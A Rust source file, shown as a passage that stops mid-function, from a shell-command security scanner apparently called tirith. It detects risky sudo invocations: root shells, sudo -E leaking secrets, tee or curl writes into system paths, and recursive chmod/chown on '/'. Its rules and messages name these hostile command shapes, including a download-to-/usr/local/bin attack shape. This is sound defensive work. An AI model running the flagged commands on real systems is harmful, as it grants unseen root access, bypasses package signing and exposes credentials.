//! Sudo-escalation rules (M8 ch4).
//!
//! Fire when the parsed leader resolves to `sudo` (incl. `sudo -u user`,
//! `--user=`, `-E`, `env`-prefixed sudo). PATTERN_TABLE entry `sudo_cmd`
//! (`\bsudo\b`) is the only tier-1 gate; detection short-circuits otherwise.
//!
//! Five High rules:
//! 1. **`SudoShellSpawn`** — `sudo sh|bash|…` opens a root shell tirith can't see
//!    (it intercepts the local shell, not a nested process).
//! 2. **`SudoEnvPreserveSensitive`** — `sudo -E` / `--preserve-env` with a sensitive
//!    env var (central sensitive-asset registry) set; the value becomes readable via
//!    `/proc/<pid>/environ` (exfil-by-misconfiguration).
//! 3. **`SudoTeeSystemFile`** — `… | sudo tee <system-path>` (`/etc/…`,
//!    `/usr/local/bin/…`, `/lib/systemd/…`, `/etc/cron*`). Shape-specific:
//!    `/tmp`, `~/…`, repo-relative targets are NOT flagged.
//! 4. **`SudoDownloadInstall`** — `sudo curl|wget|fetch -o <system-path>`; same target list.
//! 5. **`SudoRecursivePermsBroadPath`** — `sudo chmod|chown -R … /` (or `/home`,
//!    `/usr`, `/etc`); strips setuid bits, locks out homedirs, breaks packages.
//!
//! Policy: when `sudo_require_reason` is on AND an active sudo-session exists, these
//! findings DOWNGRADE High→Medium (signal kept, block avoided). When off, the session
//! file is only read for `tirith sudo session status` and never affects outcomes.

use crate::policy::Policy;
use crate::tokenize::{self, ShellType};
use crate::verdict::{Evidence, Finding, RuleId, Severity};
use std::collections::BTreeMap;

/// Run the sudo-escalation rules. Returns at most a small handful of
/// findings — most invocations fire at most one of the five.
pub fn check(input: &str, shell: ShellType, policy: &Policy) -> Vec<Finding> {
    let segments = tokenize::tokenize(input, shell);
    let mut findings: Vec<Finding> = Vec::new();

    for seg in &segments {
        let (parsed, wrapper_budget_exhausted) = parse_sudo_invocation_with_status(seg, shell);
        if wrapper_budget_exhausted {
            findings.push(make_finding(
                RuleId::AnalysisIncomplete,
                Severity::High,
                "Sudo wrapper analysis exceeded its safety budget".to_string(),
                "Tirith could not prove the effective command within the bounded wrapper depth; the invocation is blocked rather than treated as clean.".to_string(),
                input,
                seg,
            ));
            continue;
        }
        if let Some(parsed) = parsed {
            findings.extend(rules_for_segment(&parsed, input, seg, shell));
        }
    }

    if findings.is_empty() {
        return findings;
    }

    // Downgrade severity when a tagged sudo session is active and the operator opted
    // into `sudo_require_reason`. Consulted lazily so the no-finding fast path skips disk.
    if policy.sudo_require_reason {
        if let Some(_session) = crate::sudo_session::read_active_session() {
            apply_active_sudo_session_downgrade(&mut findings);
        }
    }

    findings
}

/// A tagged sudo session may acknowledge the five concrete sudo hazards, but
/// it cannot acknowledge analysis that never completed. Keeping
/// `AnalysisIncomplete` at High is the fail-closed boundary for wrapper-depth
/// exhaustion; downgrading it would turn the 32/33-wrapper block into a warn.
fn apply_active_sudo_session_downgrade(findings: &mut [Finding]) {
    for finding in findings {
        if finding.severity == Severity::High && finding.rule_id != RuleId::AnalysisIncomplete {
            finding.severity = Severity::Medium;
        }
    }
}

/// A parsed `sudo` invocation: the inner command (post-flag-strip) plus observed flags.
struct SudoParsed {
    /// `-E` / `--preserve-env` (no value): preserve ALL. Distinct from `--preserve-env=LIST`.
    preserve_env_all: bool,
    /// Specific POSIX variable names from `--preserve-env=A,B,C`.
    preserve_env_vars: Vec<String>,
    /// `sudo -s` / `--shell` or `sudo -i` / `--login`, including bundled
    /// short flags. These modes spawn a privileged shell even with no command.
    shell_mode: Option<&'static str>,
    /// Inner command base name; empty when sudo had no positional command.
    inner_cmd: String,
    /// Inner command's args (raw, quotes preserved).
    inner_args: Vec<String>,
    /// Command-scoped environment assignments from wrappers before `sudo`.
    /// Values are used transiently for value-aware RPC classification and are
    /// never copied into findings.
    wrapper_env: BTreeMap<String, ScopedEnvValue>,
    /// Whether an inner `env -i` / `--ignore-environment` cleared ambient state.
    clear_ambient: bool,
}

#[derive(Debug, Clone)]
enum ScopedEnvValue {
    Set(String),
    Unset,
}

#[derive(Default)]
struct EnvWrapperState {
    clear_ambient: bool,
    values: BTreeMap<String, ScopedEnvValue>,
}

/// Insert an assignment that executes closer to sudo than the current map.
/// POSIX variable identity is exact: aliases such as `RPC_URL` and `rpcUrl`
/// remain separate slots. Canonical folding is only for classifying each slot.
fn insert_closer_env_assignment(
    env: &mut BTreeMap<String, ScopedEnvValue>,
    name: String,
    value: ScopedEnvValue,
) {
    env.insert(name, value);
}

/// Merge an outer scope without replacing the same exact POSIX name already
/// supplied by a scope closer to the executed sudo command.
fn insert_outer_env_assignment(
    env: &mut BTreeMap<String, ScopedEnvValue>,
    name: String,
    value: ScopedEnvValue,
) {
    env.entry(name).or_insert(value);
}

fn merge_outer_env_state(parsed: &mut SudoParsed, outer: EnvWrapperState) {
    // An inner clear executes after the outer environment was established, so
    // no outer value survives it. Otherwise exact names merge without replacing
    // the value supplied closest to sudo.
    if !parsed.clear_ambient {
        for (name, value) in outer.values {
            insert_outer_env_assignment(&mut parsed.wrapper_env, name, value);
        }
    }
    parsed.clear_ambient |= outer.clear_ambient;
}

/// Parse a segment as a `sudo` invocation when its leader (after `env`-wrapper
/// resolution) is `sudo`. `None` for non-sudo segments.
#[cfg(test)]
fn parse_sudo_invocation(seg: &tokenize::Segment, shell: ShellType) -> Option<SudoParsed> {
    parse_sudo_invocation_with_status(seg, shell).0
}

fn parse_sudo_invocation_with_status(
    seg: &tokenize::Segment,
    shell: ShellType,
) -> (Option<SudoParsed>, bool) {
    let Some(cmd) = seg.command.as_deref() else {
        return (None, false);
    };
    let mut wrapper_budget_exhausted = false;
    let Some(mut parsed) =
        resolve_wrapped_sudo(cmd, &seg.args, shell, 32, &mut wrapper_budget_exhausted)
    else {
        return (None, wrapper_budget_exhausted);
    };
    // Shared tokenizer facts preserve command-scoped assignments that precede
    // the effective leader (`RPC_URL=... sudo -E cmd`). They take precedence
    // over the ambient process environment for value-aware RPC decisions.
    let mut leading_env = BTreeMap::new();
    for (name, value) in tokenize::leading_env_assignments(&seg.raw) {
        let assignment =
            crate::rules::command::normalize_shell_token(&format!("{name}={value}"), shell);
        if let Some((name, value)) = assignment.split_once('=') {
            // All assignments in this one shell prefix are peers, so ordinary
            // source-order (last assignment wins) semantics apply here.
            insert_closer_env_assignment(
                &mut leading_env,
                name.to_string(),
                ScopedEnvValue::Set(value.to_string()),
            );
        }
    }
    // An env/sudo-scoped assignment executes closer to sudo than a leading
    // shell assignment and therefore keeps precedence over this outer scope.
    if !parsed.clear_ambient {
        for (name, value) in leading_env {
            insert_outer_env_assignment(&mut parsed.wrapper_env, name, value);
        }
    }
    (Some(parsed), wrapper_budget_exhausted)
}

/// Resolve `env`/`command`/`time`/`exec`/`nohup` chains until the effective
/// command is `sudo`. Depth is bounded independently of attacker argv length.
fn resolve_wrapped_sudo(
    command: &str,
    args: &[String],
    shell: ShellType,
    depth: usize,
    wrapper_budget_exhausted: &mut bool,
) -> Option<SudoParsed> {
    let leader = command_basename(command, shell);
    if depth == 0 {
        *wrapper_budget_exhausted = leader == "sudo"
            || args
                .iter()
                .any(|arg| command_basename(arg, shell) == "sudo");
        return None;
    }
    if leader == "sudo" {
        return Some(parse_sudo_args(args, shell));
    }
    if leader == "env" {
        let (next, next_args, wrapper_env) =
            unwrap_env(args, shell, depth, wrapper_budget_exhausted)?;
        let mut parsed = resolve_wrapped_sudo(
            &next,
            &next_args,
            shell,
            depth - 1,
            wrapper_budget_exhausted,
        )?;
        merge_outer_env_state(&mut parsed, wrapper_env);
        return Some(parsed);
    }
    let (next, next_args) = match leader.as_str() {
        "command" | "exec" | "nohup" => unwrap_command_wrapper(&leader, args)?,
        "time" => unwrap_time(args)?,
        _ => return None,
    };
    resolve_wrapped_sudo(
        &next,
        &next_args,
        shell,
        depth - 1,
        wrapper_budget_exhausted,
    )
}

fn unwrap_env(
    args: &[String],
    shell: ShellType,
    split_depth: usize,
    wrapper_budget_exhausted: &mut bool,
) -> Option<(String, Vec<String>, EnvWrapperState)> {
    let mut idx = 0;
    let mut wrapper_env = EnvWrapperState::default();
    while idx < args.len() {
        let arg = crate::rules::command::normalize_shell_token(&args[idx], shell);
        if arg == "--" {
            idx += 1;
            break;
        }
        if tokenize::is_env_assignment(&arg) {
            if let Some((name, value)) = arg.split_once('=') {
                insert_closer_env_assignment(
                    &mut wrapper_env.values,
                    name.to_string(),
                    ScopedEnvValue::Set(value.to_string()),
                );
            }
            idx += 1;
            continue;
        }
        if arg == "--split-string" {
            let (next, next_args, mut split_env) = unwrap_env_split_string(
                args.get(idx + 1)?,
                &args[idx + 2..],
                shell,
                split_depth,
                false,
                wrapper_budget_exhausted,
            )?;
            if !split_env.clear_ambient {
                for (name, value) in wrapper_env.values {
                    insert_outer_env_assignment(&mut split_env.values, name, value);
                }
            }
            split_env.clear_ambient |= wrapper_env.clear_ambient;
            return Some((next, next_args, split_env));
        }
        if let Some(payload) = arg.strip_prefix("--split-string=") {
            let (next, next_args, mut split_env) = unwrap_env_split_string(
                payload,
                &args[idx + 1..],
                shell,
                split_depth,
                true,
                wrapper_budget_exhausted,
            )?;
            if !split_env.clear_ambient {
                for (name, value) in wrapper_env.values {
                    insert_outer_env_assignment(&mut split_env.values, name, value);
                }
            }
            split_env.clear_ambient |= wrapper_env.clear_ambient;
            return Some((next, next_args, split_env));
        }
        if arg == "--ignore-environment" {
            wrapper_env.clear_ambient = true;
            wrapper_env.values.clear();
            idx += 1;
            continue;
        }
        if arg == "--unset" {
            let name = crate::rules::command::normalize_shell_token(args.get(idx + 1)?, shell);
            insert_closer_env_assignment(&mut wrapper_env.values, name, ScopedEnvValue::Unset);
            idx += 2;
            continue;
        }
        if let Some(name) = arg.strip_prefix("--unset=") {
            insert_closer_env_assignment(
                &mut wrapper_env.values,
                name.to_string(),
                ScopedEnvValue::Unset,
            );
            idx += 1;
            continue;
        }
        if matches!(arg.as_str(), "--chdir" | "--argv0") {
            args.get(idx + 1)?;
            idx += 2;
            continue;
        }
        if arg.starts_with("--chdir=") || arg.starts_with("--argv0=") {
            idx += 1;
            continue;
        }
        if arg.starts_with('-') && !arg.starts_with("--") && arg.len() > 1 {
            let cluster = &arg[1..];
            let mut consumed_value = false;
            for (offset, flag) in cluster.char_indices() {
                let suffix = &cluster[offset + flag.len_utf8()..];
                if flag == 'i' {
                    wrapper_env.clear_ambient = true;
                    wrapper_env.values.clear();
                    continue;
                }
                if flag == 'u' {
                    let name = if suffix.is_empty() {
                        args.get(idx + 1).map(|value| {
                            crate::rules::command::normalize_shell_token(value, shell)
                        })?
                    } else {
                        suffix.to_string()
                    };
                    insert_closer_env_assignment(
                        &mut wrapper_env.values,
                        name,
                        ScopedEnvValue::Unset,
                    );
                    if suffix.is_empty() {
                        idx += 2;
                    } else {
                        idx += 1;
                    }
                    consumed_value = true;
                    break;
                }
                if matches!(flag, 'C' | 'a') {
                    if suffix.is_empty() {
                        args.get(idx + 1)?;
                        idx += 2;
                    } else {
                        idx += 1;
                    }
                    consumed_value = true;
                    break;
                }
                if flag == 'S' {
                    let (payload, trailing) = if suffix.is_empty() {
                        (args.get(idx + 1)?.as_str(), &args[idx + 2..])
                    } else {
                        (suffix, &args[idx + 1..])
                    };
                    let (next, next_args, mut split_env) = unwrap_env_split_string(
                        payload,
                        trailing,
                        shell,
                        split_depth,
                        !suffix.is_empty(),
                        wrapper_budget_exhausted,
                    )?;
                    if !split_env.clear_ambient {
                        for (name, value) in wrapper_env.values {
                            insert_outer_env_assignment(&mut split_env.values, name, value);
                        }
                    }
                    split_env.clear_ambient |= wrapper_env.clear_ambient;
                    return Some((next, next_args, split_env));
                }
            }
            if consumed_value {
                continue;
            }
            idx += 1;
            continue;
        }
        if arg.starts_with('-') {
            idx += 1;
            continue;
        }
        break;
    }
    while idx < args.len() {
        let assignment = crate::rules::command::normalize_shell_token(&args[idx], shell);
        if !tokenize::is_env_assignment(&assignment) {
            break;
        }
        if let Some((name, value)) = assignment.split_once('=') {
            insert_closer_env_assignment(
                &mut wrapper_env.values,
                name.to_string(),
                ScopedEnvValue::Set(value.to_string()),
            );
        }
        idx += 1;
    }
    let (command, command_args) = command_from(args, idx)?;
    Some((command, command_args, wrapper_env))
}

fn unwrap_env_split_string(
    payload: &str,
    trailing: &[String],
    shell: ShellType,
    split_depth: usize,
    payload_is_normalized: bool,
    wrapper_budget_exhausted: &mut bool,
) -> Option<(String, Vec<String>, EnvWrapperState)> {
    if split_depth <= 1 {
        *wrapper_budget_exhausted = payload
            .split(|character: char| character.is_whitespace() || matches!(character, '\'' | '\"'))
            .chain(trailing.iter().map(String::as_str))
            .any(|word| command_basename(word, shell) == "sudo");
        return None;
    }
    let payload = if payload_is_normalized {
        payload.to_string()
    } else {
        crate::rules::command::normalize_shell_token(payload, shell)
    };
    // `env -S` splits an argv vector; it does not execute shell separators.
    // Re-enter env's option/assignment grammar so payloads beginning with
    // `-i`, `-u`, or another `-S` cannot hide the eventual sudo command.
    let mut words = crate::rules::command::parse_env_split_string(&payload).ok()?;
    if words.len().saturating_add(trailing.len()) > crate::rules::command::MAX_ENV_SPLIT_ARGV {
        return None;
    }
    words.extend_from_slice(trailing);
    unwrap_env(&words, shell, split_depth - 1, wrapper_budget_exhausted)
}

fn unwrap_command_wrapper(wrapper: &str, args: &[String]) -> Option<(String, Vec<String>)> {
    let mut idx = 0;
    while idx < args.len() {
        let arg = strip_outer_quotes(&args[idx]);
        if arg == "--" {
            idx += 1;
            break;
        }
        if wrapper == "command" && matches!(arg, "-v" | "-V") {
            // Query-only command builtin modes do not execute their operand.
            return None;
        }
        if wrapper == "exec" && arg == "-a" {
            args.get(idx + 1)?;
            idx += 2;
            continue;
        }
        if arg.starts_with('-') {
            idx += 1;
            continue;
        }
        break;
    }
    command_from(args, idx)
}

fn unwrap_time(args: &[String]) -> Option<(String, Vec<String>)> {
    let mut idx = 0;
    while idx < args.len() {
        let arg = strip_outer_quotes(&args[idx]);
        if arg == "--" {
            idx += 1;
            break;
        }
        if matches!(arg, "-f" | "--format" | "-o" | "--output") {
            args.get(idx + 1)?;
            idx += 2;
            continue;
        }
        if arg.starts_with("--format=") || arg.starts_with("--output=") {
            idx += 1;
            continue;
        }
        if arg.starts_with('-') && !arg.starts_with("--") && arg.len() > 1 {
            let cluster = &arg[1..];
            let mut consumed_value = false;
            for (offset, flag) in cluster.char_indices() {
                if matches!(flag, 'f' | 'o') {
                    let suffix = &cluster[offset + flag.len_utf8()..];
                    if suffix.is_empty() {
                        args.get(idx + 1)?;
                        idx += 2;
                    } else {
                        idx += 1;
                    }
                    consumed_value = true;
                    break;
                }
            }
            if consumed_value {
                continue;
            }
            idx += 1;
            continue;
        }
        if arg.starts_with('-') {
            idx += 1;
            continue;
        }
        break;
    }
    command_from(args, idx)
}

fn command_from(args: &[String], idx: usize) -> Option<(String, Vec<String>)> {
    let command = args.get(idx)?.clone();
    Some((command, args[idx + 1..].to_vec()))
}

/// Parse the args beyond the `sudo` leader into the inner command + post-flag args.
fn parse_sudo_args(args: &[String], shell: ShellType) -> SudoParsed {
    let value_short = ['a', 'u', 'g', 'C', 'D', 'R', 'T', 'U', 'p', 'r', 't'];
    let value_long = [
        "--user",
        "--group",
        "--auth-type",
        "--close-from",
        "--chdir",
        "--prompt",
        "--chroot",
        "--role",
        "--type",
        "--other-user",
        "--host",
        "--timeout",
        "--command-timeout",
    ];

    let mut idx = 0;
    let mut preserve_env_all = false;
    let mut preserve_env_vars: Vec<String> = Vec::new();
    let mut shell_mode: Option<&'static str> = None;
    let mut inner_start: Option<usize> = None;
    let mut wrapper_env = BTreeMap::new();

    while idx < args.len() {
        let raw = &args[idx];
        let a = strip_outer_quotes(raw);
        if a == "--" {
            idx += 1;
            while let Some(raw_assignment) = args.get(idx) {
                let assignment =
                    crate::rules::command::normalize_shell_token(raw_assignment, shell);
                if !tokenize::is_env_assignment(&assignment) {
                    break;
                }
                if let Some((name, value)) = assignment.split_once('=') {
                    insert_closer_env_assignment(
                        &mut wrapper_env,
                        name.to_string(),
                        ScopedEnvValue::Set(value.to_string()),
                    );
                }
                idx += 1;
            }
            inner_start = Some(idx);
            break;
        }
        let normalized = crate::rules::command::normalize_shell_token(raw, shell);
        if tokenize::is_env_assignment(&normalized) {
            if let Some((name, value)) = normalized.split_once('=') {
                insert_closer_env_assignment(
                    &mut wrapper_env,
                    name.to_string(),
                    ScopedEnvValue::Set(value.to_string()),
                );
            }
            idx += 1;
            continue;
        }
        if a == "--shell" {
            shell_mode = Some("shell");
            idx += 1;
            continue;
        }
        if a == "--login" {
            shell_mode = Some("login");
            idx += 1;
            continue;
        }
        // -E / --preserve-env (no value): preserve ALL.
        if a == "-E" {
            preserve_env_all = true;
            idx += 1;
            continue;
        }
        if a == "--preserve-env" {
            preserve_env_all = true;
            idx += 1;
            continue;
        }
        // --preserve-env=VAR_LIST: specific vars.
        if let Some(rest) = a.strip_prefix("--preserve-env=") {
            for v in rest.split(',') {
                let v = v.trim();
                if !v.is_empty() {
                    preserve_env_vars.push(v.to_string());
                }
            }
            idx += 1;
            continue;
        }
        if a.starts_with("--") {
            let name = a.split_once('=').map(|(name, _)| name).unwrap_or(a);
            if value_long.contains(&name) && !a.contains('=') {
                if args.get(idx + 1).is_none() {
                    break;
                }
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if a.starts_with('-') && a.len() > 1 {
            let cluster = &a[1..];
            let mut consumes_next = false;
            for (offset, flag) in cluster.char_indices() {
                match flag {
                    'E' => preserve_env_all = true,
                    's' => shell_mode = Some("shell"),
                    'i' => shell_mode = Some("login"),
                    value if value_short.contains(&value) => {
                        let suffix = &cluster[offset + value.len_utf8()..];
                        consumes_next = suffix.is_empty();
                        break;
                    }
                    _ => {}
                }
            }
            if consumes_next && args.get(idx + 1).is_none() {
                break;
            }
            idx += if consumes_next { 2 } else { 1 };
            continue;
        }
        // First positional: the inner command.
        inner_start = Some(idx);
        break;
    }

    let inner_start = inner_start.unwrap_or(args.len());
    if inner_start >= args.len() {
        return SudoParsed {
            preserve_env_all,
            preserve_env_vars,
            shell_mode,
            inner_cmd: String::new(),
            inner_args: Vec::new(),
            wrapper_env,
            clear_ambient: false,
        };
    }

    let inner_cmd = command_basename(&args[inner_start], shell);
    let inner_args: Vec<String> = args[inner_start + 1..].to_vec();

    SudoParsed {
        preserve_env_all,
        preserve_env_vars,
        shell_mode,
        inner_cmd,
        inner_args,
        wrapper_env,
        clear_ambient: false,
    }
}

/// Apply the five rule checks against a parsed sudo invocation.
fn rules_for_segment(
    parsed: &SudoParsed,
    input: &str,
    seg: &tokenize::Segment,
    shell: ShellType,
) -> Vec<Finding> {
    let mut findings: Vec<Finding> = Vec::new();
    let inner = parsed.inner_cmd.as_str();
    let inner_args = &parsed.inner_args;

    // 1) sudo <interactive-shell>, including sudo's own canonical shell modes.
    if parsed.shell_mode.is_some() || is_interactive_shell(inner) {
        let shell_description: &str = match parsed.shell_mode {
            Some(mode) => mode,
            None => inner,
        };
        findings.push(make_finding(
            RuleId::SudoShellSpawn,
            Severity::High,
            format!("sudo {shell_description}: interactive root shell"),
            "This sudo invocation opens an interactive root shell. Subsequent commands typed \
             into that shell run with full privileges and are NOT seen by tirith \
             (we intercept the local shell, not nested shells). Run the specific \
             command that needs elevation with sudo, not a shell."
                .to_string(),
            input,
            seg,
        ));
    }

    // 2) sudo -E with sensitive env set
    if parsed.preserve_env_all {
        let mut active = if parsed.clear_ambient {
            Vec::new()
        } else {
            sensitive_env_active()
                .into_iter()
                .filter(|process_name| !parsed.wrapper_env.contains_key(process_name))
                .collect::<Vec<_>>()
        };
        active.extend(parsed.wrapper_env.iter().filter_map(|(name, value)| {
            let ScopedEnvValue::Set(value) = value else {
                return None;
            };
            (!value.is_empty() && crate::sensitive_assets::is_sensitive_env_assignment(name, value))
                .then_some(name.clone())
        }));
        active.sort();
        active.dedup();
        if !active.is_empty() {
            let preview = active
                .iter()
                .take(3)
                .map(|s| s.as_str())
                .collect::<Vec<_>>()
                .join(", ");
            findings.push(make_finding(
                RuleId::SudoEnvPreserveSensitive,
                Severity::High,
                "sudo -E preserves sensitive env vars into the privileged process".to_string(),
                format!(
                    "`sudo -E` (or `--preserve-env`) forwards sensitive credentials \
                     ({preview}{extra}) into the privileged process. Those values \
                     become readable via `/proc/<pid>/environ` to anything that can \
                     enumerate processes. Use `sudo --preserve-env=ONLY,VARS,YOU,NEED` \
                     to limit the surface.",
                    extra = if active.len() > 3 {
                        format!(", … {} more", active.len() - 3)
                    } else {
                        String::new()
                    }
                ),
                input,
                seg,
            ));
        }
    } else if !parsed.preserve_env_vars.is_empty() {
        // --preserve-env=VAR_LIST: exact secrets are sensitive by name; RPC
        // endpoint names are promoted only when their current value carries
        // credentials.
        let active_process = sensitive_env_active();
        let intersecting: Vec<&str> = parsed
            .preserve_env_vars
            .iter()
            .filter(|requested_name| {
                let name = requested_name.as_str();
                parsed
                    .wrapper_env
                    .get(name)
                    .map(|value| match value {
                        ScopedEnvValue::Set(value) => {
                            !value.is_empty()
                                && crate::sensitive_assets::is_sensitive_env_assignment(name, value)
                        }
                        ScopedEnvValue::Unset => false,
                    })
                    .unwrap_or_else(|| {
                        !parsed.clear_ambient
                            && (crate::sensitive_assets::is_sensitive_env_name(name)
                                || active_process
                                    .iter()
                                    .any(|candidate| candidate.as_str() == name))
                    })
            })
            .map(|s| s.as_str())
            .collect();
        if !intersecting.is_empty() {
            findings.push(make_finding(
                RuleId::SudoEnvPreserveSensitive,
                Severity::High,
                "sudo --preserve-env names sensitive env vars".to_string(),
                format!(
                    "`sudo --preserve-env={list}` explicitly forwards sensitive \
                     credentials into the privileged process. If those vars are set, \
                     they become readable via `/proc/<pid>/environ`. Drop them from \
                     the preserve-env list, or unset them before running sudo.",
                    list = intersecting.join(",")
                ),
                input,
                seg,
            ));
        }
    }

    // 3) sudo tee <system-path>
    if inner == "tee" {
        if let Some(target) = tee_targets(inner_args)
            .into_iter()
            .find(|target| is_protected_system_path(target))
        {
            findings.push(make_finding(
                RuleId::SudoTeeSystemFile,
                Severity::High,
                format!("sudo tee writes to protected system path '{target}'"),
                format!(
                    "`… | sudo tee {target}` writes attacker-controllable input \
                     to a privileged system path. If the upstream content is \
                     untrusted (a fetched script, an LLM-generated config, …) \
                     this overwrites a file the OS trusts. Confirm the input \
                     source before re-running."
                ),
                input,
                seg,
            ));
        }
    }

    // 4) sudo curl|wget|fetch -o <system-path>
    if is_download_tool(inner) {
        if let Some(target) = download_output_paths(inner, inner_args)
            .into_iter()
            .find(|target| is_protected_system_path(target))
        {
            findings.push(make_finding(
                RuleId::SudoDownloadInstall,
                Severity::High,
                format!("sudo {inner} writes downloaded content to '{target}'"),
                format!(
                    "`sudo {inner} -o {target}` downloads remote content and \
                     writes it to a privileged system path as root. The standard \
                     attack shape is `sudo curl -o /usr/local/bin/<tool> <url>` — \
                     it bypasses package signing entirely. Download to a \
                     user-writable path, review, then `sudo install` if needed."
                ),
                input,
                seg,
            ));
        }
    }

    // 5) sudo chmod|chown -R … <broad-path>
    if (inner == "chmod" || inner == "chown") && has_recursive_flag(inner_args) {
        if let Some(target) = first_broad_path_arg(inner_args, shell) {
            findings.push(make_finding(
                RuleId::SudoRecursivePermsBroadPath,
                Severity::High,
                format!("sudo {inner} -R against broad system path '{target}'"),
                format!(
                    "`sudo {inner} -R … {target}` recursively rewrites permissions on \
                     a broad system tree. This routinely strips setuid bits, locks \
                     operators out of their homedirs, and breaks distro packages. \
                     Narrow the path to the specific subdirectory you intended."
                ),
                input,
                seg,
            ));
        }
    }

    findings
}

/// Interactive shells we refuse under sudo. Mirrors `safe_command::is_interactive_shell` — keep in sync.
fn is_interactive_shell(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash"
            | "zsh"
            | "fish"
            | "dash"
            | "ksh"
            | "tcsh"
            | "csh"
            | "ash"
            | "mksh"
            | "pwsh"
            | "powershell"
            | "nu"
    )
}

fn is_download_tool(name: &str) -> bool {
    matches!(name, "curl" | "wget" | "fetch")
}

fn has_recursive_flag(args: &[String]) -> bool {
    args.iter().any(|a| {
        let a = strip_outer_quotes(a);
        a == "-R" || a == "-r" || a == "--recursive"
    })
}

/// Pull the first positional that looks like a path (not a flag/numeric mode).
/// Handles the `-R 777 /home` shape.
fn first_broad_path_arg(args: &[String], _shell: ShellType) -> Option<String> {
    let mut after_double_dash = false;
    for arg in args.iter() {
        let a = strip_outer_quotes(arg);
        if after_double_dash {
            if is_broad_path(a) {
                return Some(a.to_string());
            }
            continue;
        }
        if a == "--" {
            after_double_dash = true;
            continue;
        }
        if a.starts_with('-') && a.len() > 1 {
            continue;
        }
        // skip numeric chmod mode (777, 0755, ...) and user:group spec
        if is_chmod_mode_or_owner(a) {
            continue;
        }
        if is_broad_path(a) {
            return Some(a.to_string());
        }
    }
    None
}

/// A "broad path" is `/`, `/home`, `/usr`, `/etc`, etc. — kept deliberately narrow
/// (false-positives on `/etc/myapp/config.d` would be noisy).
fn is_broad_path(p: &str) -> bool {
    let normalized = match normalize_lexical_path(p) {
        Ok(Some(path)) => path,
        Ok(None) => return false,
        Err(()) => return p.starts_with('/') || is_home_path(p),
    };
    matches!(
        normalized.as_str(),
        "/" | "/home"
            | "/usr"
            | "/etc"
            | "/var"
            | "/opt"
            | "/srv"
            | "/lib"
            | "/lib64"
            | "/bin"
            | "/sbin"
            | "/usr/local/sbin"
            | "/var/spool/cron"
    )
}

fn is_chmod_mode_or_owner(a: &str) -> bool {
    // 777, 0755, 1777 — purely numeric.
    if a.chars().all(|c| c.is_ascii_digit()) && !a.is_empty() {
        return true;
    }
    // u+x, g-r, a=rw — symbolic mode shape.
    if a.contains(['+', '-', '='])
        && a.chars().all(|c| {
            matches!(
                c,
                'a' | 'u' | 'g' | 'o' | 'r' | 'w' | 'x' | 's' | 't' | 'X' | '+' | '-' | '='
            )
        })
    {
        return true;
    }
    // user:group — chown spec.
    if a.contains(':') && !a.starts_with('/') {
        return true;
    }
    false
}

/// Find every `tee` target. `tee` writes stdin to every positional operand, so
/// checking only the first lets a benign target hide a later privileged one.
fn tee_targets(args: &[String]) -> Vec<String> {
    let mut targets = Vec::new();
    let mut after_double_dash = false;
    for arg in args.iter() {
        let a = strip_outer_quotes(arg);
        if !after_double_dash && a == "--" {
            after_double_dash = true;
            continue;
        }
        if !after_double_dash && a.starts_with('-') && a.len() > 1 {
            continue;
        }
        targets.push(a.to_string());
    }
    targets
}

/// Find all downloader output paths using that tool's own option
/// grammar. curl uses `-o`/`--output`; wget uses
/// `-O`/`--output-document`; fetch uses `-o`.
fn download_output_paths(tool: &str, args: &[String]) -> Vec<String> {
    let mut outputs = Vec::new();
    let mut iter = args.iter().enumerate();
    while let Some((_i, arg)) = iter.next() {
        let a = strip_outer_quotes(arg);
        match tool {
            // Both downloaders accept the option clustered with other short
            // flags (`curl -fsSLo PATH`, `wget -qO PATH`), which is the spelling
            // install scripts actually use. Matching only at token start missed
            // every one of them, so share the install rule's cluster-aware
            // collector instead.
            "curl" => {
                return crate::rules::install::collect_command_option_values(
                    args,
                    ShellType::Posix,
                    "--output",
                    'o',
                    "AbcCdDeEFhHKmPQrTtUuwxXyYz",
                );
            }
            "wget" => {
                return crate::rules::install::collect_command_option_values(
                    args,
                    ShellType::Posix,
                    "--output-document",
                    'O',
                    "aABeIiIloPQRTtUuwWX",
                );
            }
            "fetch" => {
                if a == "-o" || a == "--output" {
                    if let Some((_, next)) = iter.next() {
                        outputs.push(strip_outer_quotes(next).to_string());
                    }
                    continue;
                }
                if let Some(rest) = a.strip_prefix("-o") {
                    let rest = rest.strip_prefix('=').unwrap_or(rest);
                    if !rest.is_empty() {
                        outputs.push(rest.to_string());
                    }
                }
            }
            _ => return Vec::new(),
        }
    }
    outputs
}

/// `true` when the target is under a protected system dir or a home shell-init dotfile.
/// Deliberately narrow (`tee /tmp/foo` / `~/notes.md` / `./relative` never fire). The
/// home-dotfile arm closes a gap: `check_dotfile_overwrite` catches the redirect shape
/// but not the pipe-into-`sudo tee` shape.
fn is_protected_system_path(p: &str) -> bool {
    let p = match normalize_lexical_path(p) {
        Ok(Some(path)) => path,
        Ok(None) => return false,
        // Refuse to bless a rooted path whose parent traversal escapes the
        // modeled root.
        Err(()) => return true,
    };

    // Home shell-init dotfiles are protected (bare name only; `~/.config/zsh/…` is not).
    if is_home_shell_init_dotfile(&p) {
        return true;
    }

    // Other paths under ~/ and $HOME/ are user-writable.
    if p == "~" || p.starts_with("~/") {
        return false;
    }

    // /tmp is shared but not OS-system.
    if path_is_or_under(&p, "/tmp") {
        return false;
    }
    // /var/tmp same.
    if path_is_or_under(&p, "/var/tmp") {
        return false;
    }
    const PROTECTED_ROOTS: &[&str] = &[
        "/etc",
        "/bin",
        "/sbin",
        "/usr/bin",
        "/usr/sbin",
        "/usr/local/bin",
        "/usr/local/sbin",
        "/lib",
        "/lib64",
        "/usr/lib",
        "/usr/lib64",
        "/var/spool/cron",
        "/var/www",
        "/var/lib",
        "/srv",
        "/root",
        "/boot",
    ];
    PROTECTED_ROOTS
        .iter()
        .any(|root| path_is_or_under(&p, root))
}

fn path_is_or_under(path: &str, root: &str) -> bool {
    path == root
        || path
            .strip_prefix(root)
            .is_some_and(|tail| tail.starts_with('/'))
}

fn is_home_path(path: &str) -> bool {
    path == "~"
        || path.starts_with("~/")
        || path == "$HOME"
        || path.starts_with("$HOME/")
        || path == "${HOME}"
        || path.starts_with("${HOME}/")
        || path == "${HOME:-/root}"
        || path.starts_with("${HOME:-/root}/")
}

/// Collapse redundant separators and dot components without following
/// symlinks. Root/home escape attempts are rejected instead of normalized into
/// a potentially benign spelling.
fn normalize_lexical_path(path: &str) -> Result<Option<String>, ()> {
    let path = strip_outer_quotes(path).trim();
